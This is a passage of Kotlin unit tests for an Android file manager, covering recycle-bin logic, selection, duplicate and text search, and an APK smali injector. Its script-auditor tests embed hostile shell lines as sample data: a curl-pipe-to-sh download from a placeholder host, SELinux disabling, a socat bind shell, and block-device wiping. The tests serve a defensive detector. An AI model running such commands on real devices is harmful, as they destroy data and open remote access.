                val sub = cleanPath.removePrefix("$cleanRecycle/").trimStart('/')
                "$localizedBinName/$sub/"
            }
            else -> pathStr
        }
    }

    private fun determineDeleteAction(
        isInsideRecycleBin: Boolean,
        isRecycleBinEnabled: Boolean,
        userCheckedRecycle: Boolean
    ): String {
        return if (isInsideRecycleBin) {
            "DELETE_PERMANENT"
        } else if (isRecycleBinEnabled && userCheckedRecycle) {
            "MOVE_TO_RECYCLE_BIN"
        } else {
            "DELETE_PERMANENT"
        }
    }

    @Test
    fun testRecycleBinDefaultIsOff() {
        // As requested by user: "Que vendrá off"
        val defaultRecycleBinEnabled = false
        assertFalse("Recycle Bin must default to disabled (off)", defaultRecycleBinEnabled)
    }

    @Test
    fun testIsInsideRecycleBinDetection() {
        // Base folder
        assertTrue(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle"))
        assertTrue(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle/"))

        // Subfolders and files inside recycle bin
        assertTrue(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle/document.pdf"))
        assertTrue(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle/subfolder/document.pdf"))
        assertTrue(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle/nested/a/b/c.zip"))

        // Paths outside recycle bin
        assertFalse(isPathInsideRecycleBin("/storage/emulated/0/OpenManager"))
        assertFalse(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/downloads"))
        assertFalse(isPathInsideRecycleBin("/storage/emulated/0/Download/test.apk"))
        assertFalse(isPathInsideRecycleBin("/storage/emulated/0/OpenManager/.recycle_other"))
        assertFalse(isPathInsideRecycleBin("/storage/emulated/0"))
    }

    @Test
    fun testDetermineDeleteAction() {
        // When file is inside recycle bin, always delete permanently regardless of checkboxes
        assertEquals("DELETE_PERMANENT", determineDeleteAction(isInsideRecycleBin = true, isRecycleBinEnabled = true, userCheckedRecycle = true))
        assertEquals("DELETE_PERMANENT", determineDeleteAction(isInsideRecycleBin = true, isRecycleBinEnabled = false, userCheckedRecycle = false))

        // When file is outside recycle bin and recycle bin is enabled
        assertEquals("MOVE_TO_RECYCLE_BIN", determineDeleteAction(isInsideRecycleBin = false, isRecycleBinEnabled = true, userCheckedRecycle = true))
        assertEquals("DELETE_PERMANENT", determineDeleteAction(isInsideRecycleBin = false, isRecycleBinEnabled = true, userCheckedRecycle = false))

        // When file is outside recycle bin and recycle bin is disabled (off)
        assertEquals("DELETE_PERMANENT", determineDeleteAction(isInsideRecycleBin = false, isRecycleBinEnabled = false, userCheckedRecycle = true))
        assertEquals("DELETE_PERMANENT", determineDeleteAction(isInsideRecycleBin = false, isRecycleBinEnabled = false, userCheckedRecycle = false))
    }

    @Test
    fun testDisplayPathFormatting() {
        val rootDisplay = formatRecycleDisplayPath("/storage/emulated/0/OpenManager/.recycle", localizedBinName = "Papelera de reciclaje")
        assertEquals("Papelera de reciclaje/", rootDisplay)

        val subDisplay = formatRecycleDisplayPath("/storage/emulated/0/OpenManager/.recycle/Photos/vacation.jpg", localizedBinName = "Papelera de reciclaje")
        assertEquals("Papelera de reciclaje/Photos/vacation.jpg/", subDisplay)

        val englishRoot = formatRecycleDisplayPath("/storage/emulated/0/OpenManager/.recycle", localizedBinName = "Recycle Bin")
        assertEquals("Recycle Bin/", englishRoot)

        val outsideDisplay = formatRecycleDisplayPath("/storage/emulated/0/Music")
        assertEquals("/storage/emulated/0/Music", outsideDisplay)
    }

    @Test
    fun testAutoCleanCutoffLogic() {
        val days = 7
        val now = 1700000000000L
        val cutoff = now - (days.toLong() * 24L * 60L * 60L * 1000L)

        // 8 days old (should be cleaned)
        val file8DaysOldTime = now - (8L * 24L * 60L * 60L * 1000L)
        val file8DaysOldName = "old_file.zip"
        val shouldCleanOld = file8DaysOldName != ".nomedia" && file8DaysOldTime < cutoff
        assertTrue(shouldCleanOld)

        // 2 days old (should NOT be cleaned)
        val file2DaysOldTime = now - (2L * 24L * 60L * 60L * 1000L)
        val file2DaysOldName = "recent_file.zip"
        val shouldCleanRecent = file2DaysOldName != ".nomedia" && file2DaysOldTime < cutoff
        assertFalse(shouldCleanRecent)

        // .nomedia file (should NEVER be deleted even if ancient)
        val nomediaTime = now - (100L * 24L * 60L * 60L * 1000L)
        val nomediaName = ".nomedia"
        val shouldCleanNomedia = nomediaName != ".nomedia" && nomediaTime < cutoff
        assertFalse(shouldCleanNomedia)
    }
}
```

```kt
package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class ScriptArchiveHandlingTest {

    @Test
    fun testNonExecutableDocumentsClassification() {
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("notes.txt"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("data.json"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("layout.xml"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("image.png"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("music.mp3"))
        assertTrue(ScriptRunnerHelper.isNonExecutableDocument("video.mp4"))

        // Shell scripts and binaries are NOT non-executable documents
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("install.sh"))
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("run.bash"))
        assertFalse(ScriptRunnerHelper.isNonExecutableDocument("binary.bin"))
    }

    @Test
    fun testScriptTextAuditorDetectsDangerousOperations() {
        val dangerousScript = """
            #!/bin/sh
            echo "Starting installation"
            rm -rf /storage/emulated/0/Download/*
            su -c "setenforce 0"
            curl -s https://example.com/payload.sh | sh
            mount -o remount,rw /system
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(dangerousScript)
        assertTrue("Should detect file deletion", report.deletions.isNotEmpty())
        assertTrue("Should detect root calls", report.rootCalls.isNotEmpty())
        assertTrue("Should detect network calls", report.networkCalls.isNotEmpty())
        assertTrue("Should detect system partition operations", report.systemPaths.isNotEmpty())
        assertTrue("Total findings should be > 0", report.totalFindings >= 4)
    }

    @Test
    fun testScriptTextAuditorCleanScript() {
        val safeScript = """
            #!/bin/sh
            echo "Hello, OpenManager!"
            VAR=123
            echo "Result: ${'$'}VAR"
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(safeScript)
        assertEquals(0, report.totalFindings)
        assertTrue(report.deletions.isEmpty())
        assertTrue(report.rootCalls.isEmpty())
        assertTrue(report.networkCalls.isEmpty())
        assertTrue(report.systemPaths.isEmpty())
    }

    @Test
    fun testArchiveScriptRoutingToTextEditorSimulation() {
        // Simulating the routing decision logic in FileListFragment.openFile
        fun shouldOpenInScriptRunner(isArchivePath: Boolean, isExecutable: Boolean): Boolean {
            return !isArchivePath && isExecutable
        }

        fun isEditableScriptDocument(extension: String): Boolean {
            val supportedScriptExtensions = setOf(
                "txt", "text", "log", "md", "markdown", "json", "xml", "html", "htm", "css", "csv",
                "properties", "ini", "conf", "yaml", "yml", "toml", "java", "kt", "smali", "c", "cpp", "h",
                "sh", "bash", "zsh", "py", "pyw", "lua", "js", "ts", "jsx", "tsx", "sql", "gradle",
                "groovy", "rb", "pl", "php", "go", "rs", "bat", "cmd", "ps1", "env", "rc", "diff", "patch"
            )
            return extension.lowercase() in supportedScriptExtensions
        }

        // Inside an archive, clicking a script MUST NOT route to ScriptRunner
        val isInsideArchive = true
        val isShScript = true
        assertFalse(
            "Inside archive, script must never be sent to ScriptRunner",
            shouldOpenInScriptRunner(isInsideArchive, isShScript)
        )

        // Inside an archive, .sh must be treated as editable text document
        assertTrue(
            "Inside archive, .sh must open in text editor",
            isEditableScriptDocument("sh")
        )
        assertTrue(
            "Inside archive, .bash must open in text editor",
            isEditableScriptDocument("bash")
        )
        assertTrue(
            "Inside archive, .py must open in text editor",
            isEditableScriptDocument("py")
        )
        assertTrue(
            "Inside archive, .lua must open in text editor",
            isEditableScriptDocument("lua")
        )

        // Outside an archive, on real Linux filesystem, it CAN route to ScriptRunner
        val isOutsideArchive = false
        assertTrue(
            "Outside archive, shell script can open ScriptRunner action dialog",
            shouldOpenInScriptRunner(isOutsideArchive, isShScript)
        )
    }
}
```

`app/src/test/java/me/zhanghai/android/files/filelist/SelectionCopyMoveLogicTest.kt`:

```kt
/*
 * Copyright (c) 2026 OpenManager
 * All Rights Reserved.
 */

package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class SelectionCopyMoveLogicTest {

    data class MockFileItem(val path: String, val isDirectory: Boolean = false, val isParent: Boolean = false)

    // Simulates the selection manager logic
    class MockSelectionManager(val items: List<MockFileItem>) {
        val selected = mutableSetOf<MockFileItem>()
        var anchorPosition: Int = -1

        fun handleSwipe(position: Int) {
            val item = items.getOrNull(position) ?: return
            if (item.isParent) return

            if (item in selected) {
                // Swiping an already selected file always toggles/deselects it
                selected.remove(item)
                if (anchorPosition == position) {
                    val remaining = selected.firstOrNull()
                    anchorPosition = if (remaining != null) items.indexOf(remaining) else -1
                }
            } else {
                if (selected.isNotEmpty() && anchorPosition >= 0 && anchorPosition != position) {
                    // Range selection between anchor and position
                    val start = minOf(anchorPosition, position)
                    val end = maxOf(anchorPosition, position)
                    for (i in start..end) {
                        val it = items[i]
                        if (!it.isParent) {
                            selected.add(it)
                        }
                    }
                    anchorPosition = position
                } else {
                    // Single item selection
                    selected.add(item)
                    anchorPosition = position
                }
            }
        }
    }

    @Test
    fun testSwipeTogglesAlreadySelectedItemWhenMultipleSelected() {
        val items = listOf(
            MockFileItem("/sdcard/..", isParent = true),
            MockFileItem("/sdcard/file1.txt"),
            MockFileItem("/sdcard/file2.txt"),
            MockFileItem("/sdcard/file3.txt"),
            MockFileItem("/sdcard/file4.txt")
        )
        val manager = MockSelectionManager(items)

        // Select file1 (index 1)
        manager.handleSwipe(1)
        assertEquals(1, manager.selected.size)
        assertEquals(1, manager.anchorPosition)

        // Range swipe to file3 (index 3) -> files 1, 2, 3 selected
        manager.handleSwipe(3)
        assertEquals(3, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertTrue(manager.selected.contains(items[2]))
        assertTrue(manager.selected.contains(items[3]))
        assertEquals(3, manager.anchorPosition)

        // Now swipe file2 (index 2) which is already selected -> MUST DESELECT file2!
        manager.handleSwipe(2)
        assertEquals(2, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertFalse(manager.selected.contains(items[2]))
        assertTrue(manager.selected.contains(items[3]))

        // Now swipe file3 (which is anchor) -> MUST DESELECT file3 and update anchor!
        manager.handleSwipe(3)
        assertEquals(1, manager.selected.size)
        assertTrue(manager.selected.contains(items[1]))
        assertFalse(manager.selected.contains(items[3]))
        assertEquals(1, manager.anchorPosition)

        // Deselect the last file
        manager.handleSwipe(1)
        assertTrue(manager.selected.isEmpty())
        assertEquals(-1, manager.anchorPosition)
    }

    @Test
    fun testSelfMoveSameDirectoryValidation() {
        fun validateMove(currentDir: String, targetDir: String, sources: List<MockFileItem>): Pair<Boolean, String?> {
            val validSources = sources.filterNot { it.isParent }
            if (validSources.isEmpty()) return false to "No files"
            if (currentDir == targetDir) {
                return false to "El origen y el destino son el mismo directorio"
            }
            for (item in validSources) {
                if (item.isDirectory && (targetDir == item.path || targetDir.startsWith(item.path + "/"))) {
                    return false to "No se puede mover la carpeta dentro de sí misma o de sus subcarpetas"
                }
            }
            return true to null
        }

        val file1 = MockFileItem("/sdcard/Download/file.zip")
        val folder1 = MockFileItem("/sdcard/Download/MyFolder", isDirectory = true)

        // Case 1: Same directory move -> BLOCKED
        val (ok1, err1) = validateMove("/sdcard/Download", "/sdcard/Download", listOf(file1))
        assertFalse(ok1)
        assertEquals("El origen y el destino son el mismo directorio", err1)

        // Case 2: Moving directory into its own subfolder -> BLOCKED
        val (ok2, err2) = validateMove("/sdcard/Download", "/sdcard/Download/MyFolder/Sub1", listOf(folder1))
        assertFalse(ok2)
        assertEquals("No se puede mover la carpeta dentro de sí misma o de sus subcarpetas", err2)

        // Case 3: Moving directory into itself -> BLOCKED
        val (ok3, err3) = validateMove("/sdcard/Download", "/sdcard/Download/MyFolder", listOf(folder1))
        assertFalse(ok3)
        assertEquals("No se puede mover la carpeta dentro de sí misma o de sus subcarpetas", err3)

        // Case 4: Moving into another independent directory -> ALLOWED
        val (ok4, err4) = validateMove("/sdcard/Download", "/sdcard/Music", listOf(file1, folder1))
        assertTrue(ok4)
        assertEquals(null, err4)
    }

    @Test
    fun testCopyDirectoryIntoDescendantValidation() {
        fun validateCopy(targetDir: String, sources: List<MockFileItem>): Pair<Boolean, String?> {
            val validSources = sources.filterNot { it.isParent }
            if (validSources.isEmpty()) return false to "No files"
            for (item in validSources) {
                if (item.isDirectory && (targetDir == item.path || targetDir.startsWith(item.path + "/"))) {
                    return false to "No se puede copiar la carpeta dentro de sí misma o de sus subcarpetas"
                }
            }
            return true to null
        }

        val folder1 = MockFileItem("/sdcard/Project", isDirectory = true)

        // Copy into subfolder -> BLOCKED
        val (ok1, err1) = validateCopy("/sdcard/Project/build/outputs", listOf(folder1))
        assertFalse(ok1)
        assertEquals("No se puede copiar la carpeta dentro de sí misma o de sus subcarpetas", err1)

        // Copy into another location -> ALLOWED
        val (ok2, err2) = validateCopy("/sdcard/Backup", listOf(folder1))
        assertTrue(ok2)
        assertEquals(null, err2)
    }

    @Test
    fun testScriptAuditDetectsDangerousCommandsAndDeletions() {
        val dangerousScript = """
            #!/system/bin/sh
            echo "Starting test..."
            su -c "setenforce 0"
            curl -O https://example.com/payload.sh
            rm /storage/emulated/0/Music/prueba_openmanager.txt
            rmdir /sdcard/temp
            dd if=/dev/zero of=/dev/block/bootdevice
            echo "Done"
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(dangerousScript)
        assertTrue(report.totalFindings > 0)
        assertTrue(report.deletions.isNotEmpty())
        assertTrue(report.rootCalls.isNotEmpty())
        assertTrue(report.networkCalls.isNotEmpty())
        assertTrue(report.systemPaths.isNotEmpty())

        // Verify specific detections
        assertTrue(report.deletions.any { it.contains("rm /storage/emulated/0/Music/prueba_openmanager.txt") })
        assertTrue(report.deletions.any { it.contains("rmdir") })
        assertTrue(report.deletions.any { it.contains("dd if=") })
        assertTrue(report.rootCalls.any { it.contains("su -c") })
        assertTrue(report.networkCalls.any { it.contains("curl") })
        assertTrue(report.systemPaths.any { it.contains("/dev/block") })
    }

    @Test
    fun testScriptAuditCleanScriptReportsZeroFindings() {
        val safeScript = """
            #!/system/bin/sh
            # This is a safe script that just echos info
            echo "Hello Android!"
            date
            uname -a
            ls -la
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(safeScript)
        assertEquals(0, report.totalFindings)
        assertTrue(report.deletions.isEmpty())
        assertTrue(report.rootCalls.isEmpty())
        assertTrue(report.networkCalls.isEmpty())
        assertTrue(report.systemPaths.isEmpty())
    }

    @Test
    fun testScriptAuditDetectsExpandedDangerousPatterns() {
        val script = """
            #!/bin/sh
            unlink /storage/emulated/0/Download/test.apk
            shred -u /sdcard/keys.txt
            wipe /data/local/tmp/cache
            setenforce 0
            socat TCP-LISTEN:4444,fork EXEC:/bin/sh
            pm uninstall com.example.app
            reboot bootloader
        """.trimIndent()

        val report = ScriptRunnerHelper.auditScriptText(script)
        assertTrue(report.totalFindings >= 7)
        assertTrue(report.deletions.any { it.contains("unlink") })
        assertTrue(report.deletions.any { it.contains("shred") })
        assertTrue(report.deletions.any { it.contains("wipe") })
        assertTrue(report.rootCalls.any { it.contains("setenforce") })
        assertTrue(report.networkCalls.any { it.contains("socat") })
        assertTrue(report.systemPaths.any { it.contains("pm uninstall") })
        assertTrue(report.systemPaths.any { it.contains("reboot") })
    }

    @Test
    fun testScriptTerminationByUserSuppressesNotificationLoop() {
        var notifiedFinished = false
        var isTerminatedByUser = false

        fun onSessionFinishedMock(exitCode: Int) {
            if (isTerminatedByUser) {
                // Suppressed! No notification loop
                return
            }
            notifiedFinished = true
        }

        // Scenario 1: Normal finish -> notification triggered
        onSessionFinishedMock(0)
        assertTrue(notifiedFinished)

        // Scenario 2: User kills shell from notification
        notifiedFinished = false
        isTerminatedByUser = true
        // TerminalSession asynchronously calls onSessionFinished
        onSessionFinishedMock(-9)
        assertFalse("Finished notification must be suppressed when terminated by user", notifiedFinished)
    }
}
```

```kt
package me.zhanghai.android.files.filelist

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File
import java.util.regex.Matcher

class ToastDialogInjectorEngineTest {

    @Test
    fun testEscapeSmaliString() {
        val plain = "Hello World!"
        assertEquals("Hello World!", ToastDialogInjectorEngine.escapeSmaliString(plain))

        val quotes = "Hello \"World\" & \\"
        assertEquals("Hello \\\"World\\\" & \\\\", ToastDialogInjectorEngine.escapeSmaliString(quotes))

        val newlines = "Line 1\nLine 2\tTabbed"
        assertEquals("Line 1\\nLine 2\\tTabbed", ToastDialogInjectorEngine.escapeSmaliString(newlines))

        val spanish = "Configuración rápida: ¡Éxito!"
        val escaped = ToastDialogInjectorEngine.escapeSmaliString(spanish)
        assertFalse(escaped.contains("\""))
        assertTrue(escaped.contains("Configuraci\\u00f3n"))
    }

    @Test
    fun testToastPatternRegex() {
        val smaliSnippet = """
            .method public showMsg()V
                .registers 2
                const-string v0, "Test"
                const/4 v1, 0x1
                invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
                move-result-object v0
                invoke-virtual {v0}, Landroid/widget/Toast;->show()V
                return-void
            .end method
        """.trimIndent()

        val matcher = ToastDialogInjectorEngine.TOAST_PATTERN.matcher(smaliSnippet)
        assertTrue(matcher.find())
        val matchedLine = matcher.group()
        assertTrue(matchedLine.contains("Landroid/widget/Toast;->show()V"))

        val sb = StringBuffer()
        matcher.reset()
        while (matcher.find()) {
            matcher.appendReplacement(sb, Matcher.quoteReplacement("    nop # Neutralized Toast.show"))
        }
        matcher.appendTail(sb)

        val replaced = sb.toString()
        assertFalse(replaced.contains("Landroid/widget/Toast;->show()V"))
        assertTrue(replaced.contains("nop # Neutralized Toast.show"))
    }

    @Test
    fun testDialogPatternRegex() {
        val smaliWithMoveResult = """
            invoke-virtual {v0}, Landroid/app/AlertDialog${'$'}Builder;->show()Landroid/app/AlertDialog;
            move-result-object v1
            return-void
        """.trimIndent()

        val matcher1 = ToastDialogInjectorEngine.DIALOG_PATTERN.matcher(smaliWithMoveResult)
        assertTrue(matcher1.find())
        assertEquals("v1", matcher1.group(1))

        val smaliVoidDialog = """
            invoke-virtual {p1}, Landroid/app/Dialog;->show()V
            return-void
        """.trimIndent()

        val matcher2 = ToastDialogInjectorEngine.DIALOG_PATTERN.matcher(smaliVoidDialog)
        assertTrue(matcher2.find())
        assertEquals(null, matcher2.group(1))

        val smaliAndroidx = """
            invoke-virtual {v2}, Landroidx/appcompat/app/AlertDialog${'$'}Builder;->show()Landroidx/appcompat/app/AlertDialog;
            move-result-object p0
            return-void
        """.trimIndent()

        val matcher3 = ToastDialogInjectorEngine.DIALOG_PATTERN.matcher(smaliAndroidx)
        assertTrue(matcher3.find())
        assertEquals("p0", matcher3.group(1))
    }

    @Test
    fun testIsDialogClass() {
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroid/app/AlertDialog;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroid/app/AlertDialog\$Builder;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroid/app/Dialog;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroidx/appcompat/app/AlertDialog;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroidx/appcompat/app/AlertDialog\$Builder;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroid/support/v7/app/AlertDialog;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Landroid/support/v7/app/AlertDialog\$Builder;"))
        assertTrue(ToastDialogInjectorEngine.isDialogClass("Lcom/google/android/material/dialog/MaterialAlertDialogBuilder;"))

        assertFalse(ToastDialogInjectorEngine.isDialogClass("Landroid/widget/Toast;"))
        assertFalse(ToastDialogInjectorEngine.isDialogClass("Landroid/widget/PopupWindow;"))
    }

    @Test
    fun testInjectMethodCallIntoClassWithExistingOnCreate() {
        val smaliInput = """
            .class public Lcom/example/MainActivity;
            .super Landroid/app/Activity;
            .source "MainActivity.java"

            .method protected onCreate(Landroid/os/Bundle;)V
                .registers 2
                .param p1, "savedInstanceState"
                .prologue
                .line 20
                invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
                return-void
            .end method
        """.trimIndent()

        val helperSmali = """
            .method private showOpenManagerToast()V
                .registers 1
                return-void
            .end method
        """.trimIndent()

        val modified = ToastDialogInjectorEngine.injectMethodCallIntoClass(
            smaliInput,
            "Lcom/example/MainActivity;",
            "showOpenManagerToast",
            helperSmali
        )

        assertTrue(modified.contains("invoke-direct {p0}, Lcom/example/MainActivity;->showOpenManagerToast()V"))
        assertTrue(modified.contains(".method private showOpenManagerToast()V"))
        // Check order: registers, prologue, then invocation
        val indexOfPrologue = modified.indexOf(".prologue")
        val indexOfInvoke = modified.indexOf("invoke-direct {p0}, Lcom/example/MainActivity;->showOpenManagerToast()V")
        assertTrue(indexOfInvoke > indexOfPrologue)
    }

    @Test
    fun testInjectMethodCallIntoClassWithoutOnCreate() {
        val smaliInput = """
            .class public Lcom/example/SubActivity;
            .super Landroidx/appcompat/app/AppCompatActivity;
            .source "SubActivity.java"

            .method public constructor <init>()V
                .registers 1
                invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V
                return-void
            .end method
        """.trimIndent()

        val helperSmali = """
            .method private showOpenManagerDialog()V
                .registers 1
                return-void
            .end method
        """.trimIndent()

        val modified = ToastDialogInjectorEngine.injectMethodCallIntoClass(
            smaliInput,
            "Lcom/example/SubActivity;",
            "showOpenManagerDialog",
            helperSmali
        )

        assertTrue(modified.contains(".method protected onCreate(Landroid/os/Bundle;)V"))
        assertTrue(modified.contains("invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V"))
        assertTrue(modified.contains("invoke-direct {p0}, Lcom/example/SubActivity;->showOpenManagerDialog()V"))
        assertTrue(modified.contains(".method private showOpenManagerDialog()V"))
    }

    @Test
    fun testFindActivitiesOnRealApkIfAvailable() {
        val sampleApk = File("build_apk/OpenManager-debug.apk/app-debug.apk")
        if (!sampleApk.exists()) {

        }
```

```kt
package me.zhanghai.android.files.filelist.duplicate

import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

class DuplicateFinderEngineTest {

    @get:Rule
    val tempFolder = TemporaryFolder()

    @Test
    fun testDuplicateDetection() = runBlocking {
        val root = tempFolder.newFolder("scan_root")
        val subDir = File(root, "sub").apply { mkdirs() }

        val file1 = File(root, "original.txt").apply { writeText("Hello Duplicate Finder Test 1234567890!") }
        val file2 = File(subDir, "copy.txt").apply { writeText("Hello Duplicate Finder Test 1234567890!") }
        val file3 = File(root, "unique.txt").apply { writeText("Completely distinct content right here.") }

        val result = DuplicateFinderEngine.scanDuplicates(
            rootDir = root,
            recursive = true,
            minSizeBytes = 5
        )

        assertEquals(1, result.groups.size)
        val group = result.groups[0]
        assertEquals(2, group.files.size)
        assertEquals(1, result.totalDuplicateFilesCount)
        assertEquals(file1.length(), result.totalWastedBytes)

        val paths = group.files.map { it.file.name }
        assertTrue(paths.contains("original.txt"))
        assertTrue(paths.contains("copy.txt"))
        assertFalse(paths.contains("unique.txt"))
    }

    @Test
    fun testSelectionStrategies() {
        val f1 = File("mock1.txt")
        val f2 = File("mock2.txt")
        val item1 = DuplicateFileItem(f1, 100L, lastModified = 1000L, path = "/path/1")
        val item2 = DuplicateFileItem(f2, 100L, lastModified = 2000L, path = "/path/2")

        val group = DuplicateGroup("hash123", 100L, mutableListOf(item1, item2))
        val groups = listOf(group)

        // Select Oldest Duplicates: Keep oldest (f1), mark newer (f2)
        DuplicateFinderEngine.selectOldestDuplicates(groups)
        assertFalse(item1.isMarkedForDeletion)
        assertTrue(item2.isMarkedForDeletion)

        // Select Newest Duplicates: Keep newest (f2), mark older (f1)
        DuplicateFinderEngine.selectNewestDuplicates(groups)
        assertTrue(item1.isMarkedForDeletion)
        assertFalse(item2.isMarkedForDeletion)

        // Clear all selections
        DuplicateFinderEngine.clearAllSelections(groups)
        assertFalse(item1.isMarkedForDeletion)
        assertFalse(item2.isMarkedForDeletion)

        // Select All Duplicates: 1 copy kept, 1 marked
        DuplicateFinderEngine.selectAllDuplicates(groups)
        assertFalse(item1.isMarkedForDeletion)
        assertTrue(item2.isMarkedForDeletion)
    }

    @Test
    fun testFormatBytes() {
        assertEquals("0 B", formatBytes(0))
        assertEquals("500 B", formatBytes(500))
        assertEquals("1.0 KB", formatBytes(1024))
        assertEquals("1.0 MB", formatBytes(1024 * 1024))
    }
}
```

```kt
package me.zhanghai.android.files.filelist.textsearch

import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.rules.TemporaryFolder
import java.io.File

class FileTextSearchEngineTest {

    @get:Rule
    val tempFolder = TemporaryFolder()

    @Test
    fun testSearchTextSimpleAndCaseInsensitive() = runBlocking {
        val root = tempFolder.newFolder("text_search_test")
        val fileA = File(root, "fileA.txt").apply { writeText("val fooBar = 1\nval FOOBAR = 2\n") }
        val fileB = File(root, "fileB.kt").apply { writeText("fun test() {\n    println(fooBar)\n}\n") }

        // Case-insensitive search
        val resultCI = FileTextSearchEngine.searchText(
            rootDir = root,
            query = "foobar",
            caseSensitive = false
        )
        assertEquals(2, resultCI.fileMatches.size)
        assertEquals(3, resultCI.totalMatches)

        // Case-sensitive search
        val resultCS = FileTextSearchEngine.searchText(
            rootDir = root,
            query = "FOOBAR",
            caseSensitive = true
        )
        assertEquals(1, resultCS.fileMatches.size)
        assertEquals(1, resultCS.totalMatches)
        assertEquals(fileA.name, resultCS.fileMatches[0].fileName)
    }

    @Test
    fun testSearchWholeWord() = runBlocking {
        val root = tempFolder.newFolder("whole_word_test")
        File(root, "test.txt").apply { writeText("foo foobar barfoo foo") }

        val result = FileTextSearchEngine.searchText(
            rootDir = root,
            query = "foo",
            wholeWord = true
        )
        assertEquals(1, result.fileMatches.size)
        assertEquals(2, result.totalMatches)
    }

    @Test
    fun testSearchRegex() = runBlocking {
        val root = tempFolder.newFolder("regex_test")
        File(root, "data.json").apply { writeText("""{"key_001": 10, "key_002": 20, "other": 30}""") }

        val result = FileTextSearchEngine.searchText(
            rootDir = root,
            query = "key_\\d+",
            isRegex = true
        )
        assertEquals(1, result.fileMatches.size)
        assertEquals(2, result.totalMatches)
    }

    @Test
    fun testReplaceSelectedFilesOnly() = runBlocking {
        val root = tempFolder.newFolder("replace_selected_test")
        val file1 = File(root, "target1.txt").apply { writeText("replace_me and replace_me again") }
        val file2 = File(root, "target2.txt").apply { writeText("replace_me here too") }

        val searchResult = FileTextSearchEngine.searchText(root, "replace_me")
        assertEquals(2, searchResult.fileMatches.size)

        // Mark only file1 as selected ("algunas palabras")
        for (fm in searchResult.fileMatches) {
            fm.isFileSelected = (fm.file == file1)
        }

        val replaceResult = FileTextSearchEngine.replaceTextInFiles(
            fileMatches = searchResult.fileMatches,
            query = "replace_me",
            replacement = "done",
            selectedFilesOnly = true
        )

        assertEquals(1, replaceResult.filesModified)
        assertEquals(2, replaceResult.totalReplacements)
        assertEquals("done and done again", file1.readText())
        assertEquals("replace_me here too", file2.readText()) // file2 is untouched
    }

    @Test
    fun testReplaceAllFilesWithSpecialCharacters() = runBlocking {
        val root = tempFolder.newFolder("replace_all_test")
        val file1 = File(root, "a.xml").apply { writeText("<price>OLD_VALUE</price>") }
        val file2 = File(root, "b.xml").apply { writeText("<cost>OLD_VALUE</cost>") }

        val searchResult = FileTextSearchEngine.searchText(root, "OLD_VALUE")
        assertEquals(2, searchResult.fileMatches.size)

        // Replace all ("todas las palabras") with special symbols: $99.99 and backslashes \
        val replaceResult = FileTextSearchEngine.replaceTextInFiles(
            fileMatches = searchResult.fileMatches,
            query = "OLD_VALUE",
            replacement = "\$99.99\\usd",
            selectedFilesOnly = false
        )

        assertEquals(2, replaceResult.filesModified)
        assertEquals(2, replaceResult.totalReplacements)
        assertEquals("<price>\$99.99\\usd</price>", file1.readText())
        assertEquals("<cost>\$99.99\\usd</cost>", file2.readText())
    }
}
```

```kt
package me.zhanghai.android.files.fileproperties.permission

import me.zhanghai.android.files.provider.common.PosixFileModeBit
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class MtPermissionsHelperTest {

    @Test
    fun testOctal777ConversionAndDisplay() {
        val octal777 = "777".toInt(8) // 511
        val bits = MtPermissionsHelper.modeFromInt(octal777)

        assertTrue(PosixFileModeBit.OWNER_READ in bits)
        assertTrue(PosixFileModeBit.OWNER_WRITE in bits)
        assertTrue(PosixFileModeBit.OWNER_EXECUTE in bits)
        assertTrue(PosixFileModeBit.GROUP_READ in bits)
        assertTrue(PosixFileModeBit.GROUP_WRITE in bits)
        assertTrue(PosixFileModeBit.GROUP_EXECUTE in bits)
        assertTrue(PosixFileModeBit.OTHERS_READ in bits)
        assertTrue(PosixFileModeBit.OTHERS_WRITE in bits)
